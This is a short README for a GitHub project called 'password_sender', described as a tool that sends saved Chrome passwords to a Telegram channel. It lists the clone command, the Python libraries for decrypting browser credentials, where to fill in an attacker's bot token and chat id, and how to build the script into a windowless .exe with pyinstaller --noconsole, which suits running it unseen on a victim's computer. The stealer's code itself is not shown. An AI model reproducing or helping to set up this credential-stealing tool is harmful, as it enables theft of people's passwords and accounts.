# password_sender
Send Chrome passwords to telegram channel

## Installation
```
git clone https://github.com/abdurohman-karim/password_sender.git
```

## Installation Libraries
``` bash
pip install python-telegram-bot

pip install pycryptodome

pip install pywin32

```


## How to use 
``` python
bot_token = 'BOT_TOKEN'
chat_id = '-1001500553277'
```
Change [bot_token] to your bot token, and change chat_id to your channel chat_id [chat_id]

## Convert .py file to .exe
```
pip install pyinstaller
```
### And run 
```
pyinstaller --onefile --noconsole your_python_file.py
```
It's save your_python_file.exe to dist/your_python_file.exe

